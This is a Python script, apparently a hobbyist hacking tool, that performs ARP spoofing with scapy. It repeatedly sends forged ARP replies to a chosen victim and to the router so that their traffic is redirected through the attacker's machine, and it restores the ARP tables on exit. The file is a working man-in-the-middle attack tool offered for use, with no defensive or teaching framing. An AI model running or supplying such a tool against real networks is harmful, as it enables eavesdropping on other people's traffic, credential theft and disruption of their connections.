#!/usr/bin/python

import time
import scapy.all as scapy
import optparse

print('''-----------------------------''')
print('''░▒▓█ ᴀʀᴘ ꜱᴘᴏᴏꜰᴇʀ ʙʏ ᴛʜᴏᴜꜰᴇᴇ █▓▒░''')
print('''-----------------------------''')


def argd():
    pars = optparse.OptionParser()
    pars.add_option("-t","--target",dest="target",help="eg:192.168.1.1")
    pars.add_option("-r", "--router", dest="router", help="eg:192.168.43.109")
    (opts,args) = pars.parse_args()
    return opts

#func to get mac address of the victim

def getting_mac(ip): #Here ip is the ipaddress to get mac address
    mac = "xx"
    while mac == "xx":
        try:
            arp_req = scapy.ARP(pdst = ip)
            arp_mac = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # ff:ff:**** is the random mac address
            arp_mac_request = arp_mac/arp_req
            response = scapy.srp(arp_mac_request, timeout=2, verbose=False)[0]
            mac = response[0][1].hwsrc
        except:
            pass
        finally:
            return mac

#Attacking Function
def spoofing(target_ip,spoof_ip):
    target_mac = getting_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

#reversing attack
def noramal_gateway(target_ip,source_ip):
    targer_mac=getting_mac(target_ip)
    source_mac=getting_mac(source_ip)
    packet = scapy.ARP(op=2, pdst = target_ip,hwdst=targer_mac,psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet, count=5,verbose=False)


opts = argd()

router_ip= opts.router#Router IP
spoof_ip= opts.target #Victim IP


#final part calling function
sending_count = 0
try:
    while True:
        spoofing(spoof_ip,router_ip)
        spoofing(router_ip,spoof_ip)
        sending_count = sending_count + 2
        print("\r[+] Sucessful Sent Packets : " + str(sending_count),end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Exiting Spoofing , Restoring Normal Gateway")
    noramal_gateway(spoof_ip,router_ip)
